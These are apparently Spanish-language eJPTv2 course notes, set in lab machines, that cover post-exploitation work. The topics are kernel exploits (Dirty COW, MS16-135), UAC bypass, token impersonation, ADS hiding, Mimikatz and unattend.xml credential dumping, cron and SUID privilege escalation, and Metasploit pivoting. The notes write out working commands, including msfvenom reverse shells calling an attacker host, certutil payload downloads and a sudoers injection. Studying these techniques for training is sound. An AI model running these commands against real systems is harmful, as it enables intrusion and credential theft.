Ahora vamos a compilar uno para Linux. Utilizaremos el exploit “Dirty COW” (Linux Kernel 2.6.22 <3.9). Un exploit para escalada de privilegios, que también está escrito en C.

En este caso, tenemos información para una correcta compilación en la documentación del código. Buscamos el exploit:

```bash
searchsploit Dirty Cow
```

Obtenemos el que estamos buscando:

```bash
searchsploit -m 40839.c
```

```bash
gcc -pthread 40839.c -o exploit -lcrypt
```

Ya tenemos el binario de Linux “exploit”.

Si tenemos errores a la hora de compilar un exploit, hay un repositorio de GitHub que tiene infinidad de exploits ya compilados correctamente:

https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits

# Post-Explotación

## Escalada de privilegios en Windows

### Windows Kernel Exploits

Windows NT es el kernel que viene por defecto con Windows y opera como un núcleo tradicional. Explotar el kernel no es un buen vector de entrada para una escalada de privilegios, ya que aumenta la posibilidad de provocar fallos en el sistema y conducir a la perdida de datos. La escalada de privilegios en Windows, típicamente seguirá los siguientes pasos:

- Identificar vulnerabilidades del kernel para la versión específica del objetivo.
- Descargar, compilar y transferir exploits del kernel al sistema de destino para ejecutarlos.

La primera herramienta que vamos a utilizar se llama **Windows-Exploit-Suggester**, que es una herramienta de Python que compara el objetivo con la base de datos de vulnerabilidades de Microsoft para detectar posibles vectores de ataque. Notificará, además, los módulos correspondientes a cada vulnerabilidad.

[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

Existe también un repositorio en GitHub llamado Windows-Kernel-Exploits, que se trata de una colección de vulnerabilidades del kernel de Windows ordenadas por CVE.

[windows-kernel-exploits/MS16-135 at master · SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)

En el momento en que conseguimos acceso al sistema, comenzamos con el proceso de escalada de privilegios. Iniciamos con la herramienta Metasploit, que tiene un comando que automatiza la escalada de privilegios, aunque lo más probable es que falle. El comando se introduce en una sesión de meterpreter de la siguiente forma:

```bash
meterpreter > getsystem
```

Si con esto no conseguimos permisos de administrador, tenemos que hacerlo paso a paso. Ponemos la sesión meterpreter en segundo plano y vamos a usar un módulo muy útil que enumera todas las vulnerabilidades de esta versión del SO:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION <num sesión meterpreter>
run
```

A continuación, buscamos información sobre cada módulo que se nos lista para determinar cuál se adapta mejor a nuestro objetivo. En este ejemplo utilizamos el siguiente:

```bash
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION <num sesión meterpreter>
set LPORT <puerto libre localhost>
run
```

Si todo está correcto, en este punto deberíamos tener una sesión meterpreter con permisos elevados.

Ahora vamos a hacer una escalada de privilegios manual con **Windows-Exploit-Suggester**. Una vez dentro de la sesión meterpreter, pasamos a una sesión “shell” con el siguiente comando:

```bash
meterpreter > shell
```

Ahora necesitamos obtener toda la información posible del sistema objetivo, para ello, introducimos este comando:

```bash
systeminfo
```

A continuación, copiamos la información de la salida en un archivo de texto. Esta información es vital para determinar que exploits son óptimos para esta versión de windows. Copiamos el texto y finalizamos la shell con “ctrl+c” para volver a la sesión meterpreter.

Seguidamente, en otra ventana de terminal creamos un fichero que se llame, por ejemplo, “Windows7.txt”, y pegamos la salida de systeminfo.

Ahora, vamos al directorio donde clonamos el repositorio de GitHub de la herramienta Windows-Exploit-Suggester e introducimos el siguiente comando para descargar una nueva base de datos con vulnerabilidades actualizada:

```bash
./windows-exploit-suggester.py —update
```

Entonces, lanzamos el siguiente comando:

```bash
./windows-exploit-suggester.py --database <base_datos.xls> --systeminfo <ruta_Windows7.txt>
```

Esto nos devuelve una lista con los exploits más efectivos para este SO en concreto. Buscamos uno para escalada de privilegios en Metasploit. Para este ejemplo, vamos a utilizar MS16-135, y debajo nos aparece el link a un exploit (41015.exe), así que, lo descargamos. 

Ahora, desde la sesión meterpreter, navegamos hasta la raíz con el comando:

```bash
	meterpreter > cd C:\\ # Nos desplazamos a la raíz
	meterpreter > cd Temp\\ # Nos desplazamos al directorio Temp
```

Como vamos a copiar un exploit en el sistema, es recomendable guardarlo en el directorio Temp, tanto en Windows como en Linux, para evitar que nos detecten. A continuación, vamos a cargar el exploit:

```bash
meterpreter > upload /Downloads/41015.exe
```

Cambiamos a una sesión “shell” y ejecutamos el fichero:

```bash
meterpreter > shell
C:\Temp>.\41015.exe
```

Nos pide que indiquemos una versión de Windows. En este ejemplo, elegimos la opción 7 - Windows 7. El nuevo comando sería:

```bash
C:\Temp>.\41015.exe 7
```

Puede tardar unos minutos, y al finalizar, podemos comprobar con el comando “whoami” que ya tenemos permisos elevados.

### Bypassing UAC con UACMe

Esta técnica consiste en evadir el control de cuentas de usuario (UAC) con una herramienta llamada **UACMe**. Es un vector de escalada de privilegios muy eficiente. La técnica y la herramienta utilizadas dependerán de la versión del SO del objetivo y del nivel de integridad del UAC del sistema.

La herramienta UACMe permite a los atacantes ejecutar cargas útiles maliciosas en un objetivo de Windows con privilegios administrativos elevados al abusar de la herramienta **AutoElevate** de Windows (ventana “Ejecutar como administrador”).

Para poder alcanzar privilegios elevados con esta técnica, es necesario tener inicialmente una sesión de un usuario que forme parte del grupo de administradores.

En la máquina de ejemplo que vamos a utilizar, vemos que corre un servidor de archivos por el puerto 80 (rejetto), así que, nos vamos a Metasploit para explotar esta vulnerabilidad y conseguir acceso:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Una vez obtenida la sesión meterpreter, comenzamos con la escalada de privilegios. Lo primero es realizar una enumeración para identificar la versión de Windows que se está ejecutando en el objetivo, y más datos que nos serán útiles para la escalada. Utilizamos los siguientes comandos:

```bash
meterpreter > sysinfo # Información del sistema
meterpreter > pgrep explorer # Exploración de procesos (Devuelve PID explorer)
meterpreter > migrate <PID_explorer>
meterpreter > sysinfo # Ahora la sesión meterpreter es 32bits (x64)
meterpreter > getuid # Vemos con que usuario estamos conectados.
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2082.png)

El usuario con el que estamos conectados no es administrador, aunque se llame admin. Con el siguiente comando podemos comprobar los permisos de este usuario:

```bash
meterpreter > getprivs
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2083.png)

Ahora debemos verificar si este usuario es parte del grupo de administradores locales, y sólo podremos hacerlo desde una sesión “shell”:

```bash
meterpreter > shell
C:\Windows\system32 > net user # Devuelve las cuentas existentes.
C:\Windows\system32 > net localgroup administrators
```

Vemos que el usuario “admin” forma parte del grupo de administradores, por lo que puede ejecutar programas con privilegios elevados, pero para hacerlo, necesitamos omitir UAC.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2084.png)

A continuación, en una nueva terminal vamos a generar el payload con **msfvenom**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_IP> LPORT=1234 -f exe > backdoor.exe
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2085.png)

El siguiente paso es ponernos en escucha con **msfconsole**:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <local_IP>
set LPORT 1234
run
```

Quedamos a la escucha y volvemos a la sesión de meterpreter. Creamos un directorio temporal en la raíz.

```bash
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload backdoor.exe # Cargamos la puerta trasera que creamos
```

Tenemos que cargar también la herramienta **Akagi64.exe**, que es parte del kit UACMe y creada por hFireFOX, que explora métodos de evasión UAC en Windows. La cargamos de la misma forma que la puerta trasera:

```bash
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter > shell # Cambiamos a una sesión shell
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2086.png)

En este momento, si quisiéramos ejecutar la puerta trasera con privilegios administrativos, no seríamos capaces porque UAC nos impediría hacerlo. Tenemos que evadir el UAC con el método 23.

```bash
C:\Temp> akagi64.exe 23 C:\Temp\backdoor.exe
```

Después de ejecutarlo, volvemos al terminal donde estábamos a la escucha con Metasploit, y tenemos una sesión de meterpreter.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2087.png)

Si comprobamos nuestro usuario con “getuid”, vemos que seguimos siendo “admin”, pero ahora tenemos privilegios elevados, y lo comprobamos con el comando “getprivs”.

Podemos enumerar el árbol de procesos con “ps” y podemos migrar a cualquiera que tenga privilegios de AUTHORITY\SYSTEM.

```bash
meterpreter > migrate 688 # por ejemplo
meterpreter > getuid
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2088.png)

Ahora tenemos una sesión meterpreter de administrador.

### Suplantación de Token de Acceso

Esta técnica permite que un proceso se haga pasar por otro usuario con mayores permisos, como Administrador o SYSTEM. Se aprovecha de cómo Windows maneja la autenticación y los tokens de acceso, los cuales definen qué permisos tiene un proceso en el sistema. Un token de acceso almacena la siguiente información:

- Usuario y SID (Security Identifier).
- Privilegios y permisos (Ejemplo: `SeDebugPrivilege`, `SeImpersonatePrivilege`).
- Grupos de seguridad a los que pertenece el usuario.
- Nivel de integridad (bajo, medio, alto, SYSTEM).

Los tokens están gestionados por LSASS (Local Security Authority Subsystem Service), y los crea el proceso **winlogon.exe** cada vez que un usuario se autentica. 

Para que sea posible utilizar esta técnica, el usuario que hemos obtenido, debe tener los siguientes privilegios:

- `SeAssignPrimaryToken` : Permite suplantar tokens.
- `SeCreateToken` : Permite crear tokens arbitrarios con privilegios administrativos.
- `SeImpersonatePrivilege` : Permite crear un proceso bajo el contexto de seguridad de otro usuario, normalmente con privilegios administrativos.

Una vez que tenemos la sesión meterpreter de un usuario con estos privilegios (usamos el ejemplo de rejetto), migramos al proceso explorer (pgrep explorer), y vemos que la operación falla, porque no tenemos privilegios suficientes (getprivs). Podemos ver que tenemos `SeImpersonatePrivilege` , lo que significa que podemos utilizar esta sesión meterpreter para suplantar otro token de acceso.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2089.png)

Para ello, cargamos el siguiente módulo:

```bash
meterpreter > load incognito
```

Si nos muere la sesión meterpreter, es por haber tratado de cambiar de proceso anteriormente, volvemos a lanzar el exploit para recuperar la sesión y volvemos a cargar “incognito”.  Ahora podemos listar los tokens:

```bash
meterpreter > list_tokens -u
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2090.png)

Para suplantar el token de Administrator, copiamos el nombre del token y lanzamos el siguiente comando:

```bash
meterpreter > impersonate_token "<name_token>" 
```

Si comprobamos nuestro “uid”, vemos que somos el usuario del token que acabamos de suplantar, pero al listar nuestros privilegios nos falla la operación.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2091.png)

En este momento, volvemos a buscar el proceso “explorer” y migramos. Volvemos a consultar los privilegios, et voilà! 

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2092.png)

Si estamos en una situación en la que no encontramos un token con privilegios elevados al que suplantar, necesitamos usar el “**PotatoAttack**”. Lo que hará es crear un token de acceso para AUTHORITY\SYSTEM que luego podremos suplantar.

## Vulnerabilidades Sistema de Archivos Windows

### Alternate Data Streams

ADS en NTFS (New Technology File System) es una atributo diseñado para que este sistema de archivos de Windows sea compatible con es sistema de archivos HFS (Hierarchical File System) de MacOS.

Cualquier fichero creado en NTFS se bifurca en dos flujos diferentes:

- Data Stream : Contiene los datos del fichero.
- Resource Stream : Contiene los metadatos.

Esto se puede utilizar para ocultar código malicioso o ejecutables en archivos para evadir la detección.

Vamos a demostrarlo con un ejemplo simple. Primero creamos una archivo de texto normal:

```bash
echo "Estas son mis notas importantes" > notas.txt
```

Ahora vamos a ocultar un ejecutable dentro del archivo de texto:

```bash
type C:\Windows\System32\calc.exe > notas.txt:hidden.exe
```

Esto no cambiará el tamaño de notas.txt, pero ahora calc.exe está oculto dentro del archivo. Para ejecutarlo utilizamos el siguiente comando;

```bash
start notas.txt:hidden.exe
```

Esto abrirá calc.exe directamente desde el ADS.

## Windows Credential Dumping

### Hashes de contraseñas en Windows

Los hashes de las contraseñas de los usuarios en Windows se almacenan en la base de datos **SAM** (Security Accounts Manager). 

La autenticación y verificación de credenciales de usuarios la realiza el LSA (Local Secutiry Authority).

Las versiones por encima de Windows Server 2003 utilizan dos tipos diferentes de hashes:

- LM
- NTLM

Windows deshabilita los hashes LM y utiliza solamente NTLM desde Windows Vista en adelante.

La base de datos SAM no se puede copiar mientras se está ejecutando el sistema operativo. En versiones modernas de Windows, esta base de datos está cifrada con **syskey**.

Una forma de encontrar credenciales en Windows es buscando en archivos de configuración que se utilizan para automatización de la instalación de Windows en equipos, concretamente, con la herramienta “ Unattended Windows Setup”.

Estos archivos de configuración, contienen credenciales de cuentas de usuario específicas, normalmente de la cuenta Administrator, y la de usuarios que se quieran crear durante la instalación del sistema. 

Esta herramienta, normalmente, utiliza los siguientes archivos de configuración:

- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Autounattend.xml

Normalmente, las contraseñas localizadas en estos archivos están en **base64**.

Veamos en un ejemplo el proceso. Debemos obtener previamente una sesión meterpreter. En este ejemplo, creamos un payload con **msfvenom**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<loca_IP> LPORT=1234 -f exe > payload
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2093.png)

A continuación, creamos un servidor http con python para descargar el payload desde la máquina víctima:

```bash
python -m SimpleHTTPServer 80
```

Desde la maquina objetivo introducimos el siguiente comando:

```bash
certutil -urlcache -f http://<IP_atacante>/payload.exe payload.exe
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2094.png)

Ahora volvemos a nuestra máquina atacante y abrimos msfconsole. Lanzamos el módulo:

```bash
use multi/hanlder
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST <local_IP>
run
```

Quedamos a la escucha y ejecutamos el payload en la máquina objetivo para conseguir acceso. 

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2095.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2096.png)

Ahora, desde la sesión meterpreter, buscamos los archivos de configuración:

```bash
meterpreter > search -f unattend.xml
```

Podemos buscarlos manualmente, porque sabemos donde pueden estar.

```bash
meterpreter > cd C:\\
meterpreter > cd Windows
meterpreter > cd Panther
meterpreter > dir
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2097.png)

Cuando los encontremos, podemos descargarlos con el siguiente comando:

```bash
meterpreter > download unattend.xml
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2098.png)

Hacia el final del fichero, podemos ver una etiqueta “**AutoLogon**”, que contiene contraseñas.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%2099.png)

En este ejemplo, encontramos la de “administrator”, que está codificada en base64. Copiamos la contraseña y creamos un fichero de texto, donde la vamos a pegar. Vamos a utilizar una herramienta para descodificarla:

```bash
base64 -d password.txt
```

Nos devuelve la contraseña en texto plano.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20100.png)

Ahora nos vamos a autenticar con **psexec**.

```bash
psexec.py Administrator@<IP_target>
```

Introducimos la contraseña y listo, somos authority\system.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20101.png)

### Volcado de hashes con Mimikatz

Mimikatz es una herramienta de post-explotación para Windows. Permite la extracción en texto claro de contraseñas, hashes y tickets Kerberos desde la memoria.

Lo primero que haremos será conseguir acceso a la máquina objetivo y obtener privilegios elevados. A continuación, cargamos el programa “Kiwi” en la sesión meterpreter con el siguiente comando:

```bash
meterpreter > load kiwi
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20102.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20103.png)

Volvamos todas las credenciales con el siguiente comando:

```bash
meterpreter > creds_all
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20104.png)

Realizamos un volcado de la base de datos SAM con el siguiente comando:

```bash
meterpreter > lsa_dump_sam
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20105.png)

Como vemos, con esta herramienta podemos obtener infinidad de datos críticos, aunque puede ser una tarea muy difícil descifrar los hashes, se explica como se hace en el apartado [Ataques Pass-the-Hash](https://www.notion.so/Ataques-Pass-the-Hash-19a403fef4da80e59f36c5e0134edf92?pvs=21) .

Podemos cargar desde kali el ejecutable **Mimikatz**.exe con el siguiente comando:

```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20106.png)

Abrimos una sesión shell desde meterpreter y ejecutamos el fichero Mimikatz.exe.

```bash
meterpreter > shell
C:\Temp> ./mimikatz.exe
```

Se nos abre una sesión mimikatz. Primero debemos verificar si realmente tenemos los privilegios apropiados, y esto lo confirmamos escribiendo:

```bash
mimikatz > privileg::debug
```

Si la salida es OK, todo está correcto. Ahora, para volcar el contenido de la base de datos SAM, escribimos:

```bash
mimikatz > lsadump::sam
```

Esto nos proporciona mucha más información que **Kiwi**, aunque no obtenemos nada importante en texto claro. También podemos volcar los “secrets” con el siguiente comando:

```bash
mimikatz >lsadump::secrets
```

Podemos mostrar las contraseñas de inicio de sesión. Si cuando un usuario inicia sesión, si el sistema a sido configurado para almacenar esa contraseña en texto claro, Mimikatz puede mostrárnosla:

```bash
mimikatz >sekurlsa::logonpasswords
```

Si nos aparece como “null” el campo de las contraseñas, significa que el sistema no está configurado para almacenarlas en texto claro.

## Escalada de privilegios en Linux

### Linux Kernel Exploits

La finalidad es obtener una shell o poder ejecutar comandos con privilegios elevados. El proceso varía dependiendo de la versión de Linux del sistema objetivo. La escalada de privilegios, normalmente sigue los siguientes pasos:

- Identificar vulnerabilidades del kernel.
- Descargar, compilar y transferir exploits del kernel dentro del objetivo.

Utilizaremos una herramienta llamada **Linux-Exploit-Suggester**:

https://github.com/mzet-/linux-exploit-suggester

Es peligroso utilizar los exploits del kernel, porque si la versión no coincide completamente, puede ocasionar problemas graves en el núcleo del SO, como **Kernel Panic** por ejemplo.

Una vez clonado el repositorio de la herramienta anterior, subimos al directorio /tmp el fichero [les.sh](http://les.sh) en la sesión meterpreter de la maquina objetivo. A continuación, cambiamos a una sesión bash (/bin/bash -i) para darle permisos de ejecución al fichero (chmod +x les.sh), y lo ejecutamos (./les.sh).

Esto nos devuelve una lista de exploits a los que es vulnerable esta versión del sistema operativo. Al principio de la salida se lista información importante sobre la arquitectura, versión del kernel, distribución, etc.

En nuestro ejemplo, vemos que el exploit más apropiado es el “Dirty COW” CVE-2016-5195. Buscamos y descargamos el exploit. Se trata de un script en C, que aprovechando una vulnerabilidad de condiciones de carrera, es capaz de crear un usuario “firefart” con privilegios elevados.

Podemos compilarlo en nuestra máquina o en el objetivo, pero necesitamos el compilador de C instalado (GCC). Compilamos con:

`gcc -pthread dirty.c -o dirty -lcrypt`

Una ver compilado, transferido al objetivo y ejecutado, podemos acceder a la máquina via SSH con el usuario “firefart” y contraseña “password123”.

### Vulnerabilidades Cron Jobs

Linux implementa la programación de tareas a través de una utilidad llamada Cron. Cron es una servicio basado en tiempo que ejecuta aplicaciones, scripts y otros comandos repetidamente en un horario específico.

Es importante tener en cuenta que los Cron Jobs se pueden ejecutar como cualquier usuario del sistema. Sin embargo, para la escalada de privilegios, nos centraremos en los creados por Root, ya que éstos, se ejecutarán con privilegios de administrador.

Vamos a comenzar con el ejemplo para ver con más claridad como podemos llevar a cabo una escalada de privilegios haciendo uso de posibles fallos de configuración en Cron Jobs.

Tenemos acceso a la máquina víctima, concretamente con el usuario “student”, que no tiene permisos de root. Vemos que en el directorio “home” de este usuario sólo tenemos un fichero llamado “message”, y que pertenece a root.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20107.png)

Vamos a ver los cron jobs que se han programado para este usuario en particular:

```bash
crontab -l
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20108.png)

No vemos ninguno con este método, pero prestando atención al archivo “message”, vemos que el propietario es root, y nos debemos preguntar cómo lo ha puesto ahí (el posible cron job que coloca ahí ese fichero debe contener la ruta en la que lo coloca). Podemos investigar, desde la raíz, ficheros que contengan texto que coincida con la ruta de este archivo.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20109.png)

```bash
grep -rnw /usr -e “/home/student/message”
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20110.png)

Vemos que hay un script “copy.sh” que copia en el directorio de “student” el fichero situado en /tmp. Vamos a echar un vistazo al script:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20111.png)

Lo único que hace es copiar el archivo “message”. Vamos a comprobar los permisos del script para ver si podemos modificarlo:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20112.png)

Podemos modificarlo, pero no podemos usar ningún editor de texto, por lo que tendremos que hacerlo a machete. La idea es introducir una línea en ese script que otorgue privilegios elevados a nuestro usuario “student”. Lo haremos de la siguiente forma:

```bash
printf ‘#!/bin/bash\necho “student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

La línea que guardamos en copy.sh, introduce en /etc/sudoers el contenido 

```bash
student ALL=NOPASSWD:ALL
```

Esto permite al usuario student ejecutar cualquier comando sin necesidad de permisos. Ahora esperamos un par de minutos hasta que se vuelva a ejecutar el cron job y comprobamos los permisos de nuestro usuario.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20113.png)

Ahora, vemos que “student” puede ejecutar cualquier comando sin contraseña:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20114.png)

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20115.png)

### Explotación de Binarios SUID

SUID (Set Owner User ID) es un permiso especial en Linux que permite que un archivo ejecutable se ejecute con los permisos de su propietario en lugar del usuario que lo ejecuta. Se usa comúnmente en programas que necesitan privilegios elevados para realizar ciertas tareas.

Comenzamos con el ejemplo. Estamos en la máquina student y vemos que tenemos los siguientes archivos en su directorio:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20116.png)

Vemos que el archivo “welcome” tiene activados los permisos SUID (lo indica la “**s**”):

```bash
-rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome
```

Comprobemos si podemos ejecutarlo:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20117.png)

Vamos a ver la información de este fichero con el comando “file”:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20118.png)

Podemos comprobar también las cadenas que contiene:

```bash
strings <file_name>
```

Si nos fijamos, vemos que este ejecutable está llamando a un binario externo llamado “greetings”.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20119.png)

Lo que podemos hacer ahora, es eliminar el fichero “greetings” del directorio, y crear un script en bash que se llame igual, pero que ejecute los comandos que nos interesan para la escalada de privilegios. En este caso, vamos a copiar una bash y guardarla como “greetings”:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20120.png)

Esa bash se ejecutará con permisos de root, por lo que vamos a ejecutar “welcome” y a ver si nos funciona:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20121.png)

Ahora somos usuario root.

## Linux Credential Dumping

### Hashes de contraseñas en Linux

En Linux, toda la información de todas las cuentas de usuario se almacena en el fichero “**passwd**” en:

```bash
/etc/passwd
```

No podemos ver las contraseñas en este archivo porque están encriptadas, aunque cualquier usuario puede acceder a el. Todas las contraseñas cifradas de los usuarios se almacenan en el fichero “**shadow**” en:

```bash
/etc/shadow
```

A este fichero sólo se puede acceder como root. Las contraseñas codificadas tendrán un prefijo que será:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20122.png)

Comenzamos con el ejemplo. Lo primero es explotar la máquina para conseguir acceso:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20123.png)

Este módulo nos ha dado ya privilegios elevados. Vamos a poner en segundo plano esta sesión y actualizarla a una sesión meterpreter con la opción “-u” (upgrade).

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20124.png)

Entramos en la sesión meterpreter:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20125.png)

Ahora vamos a ver el contenido del archivo “shadow”:

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20126.png)

La cuenta root es el único usuario, por eso sólo aparece su contraseña. El “$6$” nos indica que el algoritmo de cifrado es SHA-512.

Otra forma de conseguir esta información es con el siguiente módulo de Metasploit:

```bash
use post/linux/gather/hashdump
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20127.png)

Podemos crackear la contraseña con el siguiente módulo de Metasploit:
`use auxiliary/analyze/crack_linux`
`set SHA512 true`

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20128.png)

## Pivoting

El pivoting es una técnica de post-explotación que consiste en utilizar un host comprometido, conectado a múltiples redes, para ganar acceso a sistemas en una red diferente a la nuestra. Después de ganar acceso a un host, podemos explotar sistemas conectados a redes a las que no teníamos acceso previamente.

Aunque el host sólo esté conectado a una red, podemos pivotar desde éste a otros sistemas en esa misma red también.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20129.png)

La herramienta meterpreter de Metasploit ya tiene comandos para enrutar el tráfico desde la máquina atacante a otro host pasando por el host comprometido, del cuál hemos obtenido una sesión meterpreter.

Vamos con el ejemplo.

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20130.png)

Una vez conseguido el acceso a la víctima 1, tenemos una sesión meterpreter, introducimos el siguiente comando:

```bash
meterpreter > run autoroute -s <network>
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20131.png)

En nuestro ejemplo:

```bash
meterpreter > run autoroute -s 10.2.20.0/20
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20132.png)

Podemos enumerar todas las rutas activas con el siguiente comando:

```bash
meterpreter > run autoroute -p
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20133.png)

Una vez creada la ruta, ponemos en segundo plano esa sesión meterpreter:

```bash
meterpreter > background
```

Tenemos que utilizar un módulo de metasploit llamado:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <IP_Target_2> # IP de la máquina a la que queremos acceder con pivoting.
set PORTS 1-100 # Para este ejemplo sabemos que es el puerto 80.
run
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20134.png)

Ahora tenemos que identificar la versión exacta del servicio que se ejecuta en el puerto por el que hemos accedido a la máquina víctima 2, en nuestro ejemplo, en el puerto 80. Esto podemos hacerlo con módulos de metasploit, pero es preferible utilizar nmap para obtener resultados más precisos. Para esto, como nmap está fuera de metasploit, tenemos que dirigir el puerto 80 de la máquina víctima 2 a nuestra máquina atacante Kali.

Listamos las sesiones en metasploit, y utilizamos la que teníamos en segundo plano de la víctima 1. Vamos a realizar **Port Forwarding** (Reenvío de puertos). Vamos a introducir el siguiente comando:

```bash
meterpreter > portfwd add -l <Kali_port> -p <Victim2_port> -r <Victim2_IP>
```

Para nuestro ejemplo:

```bash
meterpreter > portfwd add -l 1234 -p 80 -r 10.2.29.26
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20135.png)

Está hecho. Abrimos una nueva terminal y vamos a realizar un escaneo con Nmap a la víctima 2:

```bash
nmap -sV -p <Kali_port> localhost
```

En nuestro ejemplo hemos elegido el puerto 1234, así que:

```bash
nmap -sV -p 1234 localhost
```

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20136.png)

Esto nos dirá qué servicio se está ejecutando en el puerto 80 de la máquina víctima 2. Vemos, en este ejemplo, que podemos explotar el servicio con metasploit, así que, enviamos a segundo plano la sesión meterpreter, buscamos el exploit adecuado, en este caso:

```bash
use exploit/windows/http/badblue_passthru
set payload windows/meterpreter/bind_tcp # Necesario en este caso.
set RHOSTS <Victim2_IP>
run
```

Ahora tenemos una sesión meterpreter en la máquina víctima 2.  

![image.png](Curso%20EJPTv2%20194403fef4da80df82fada01929fa777/image%20137.png)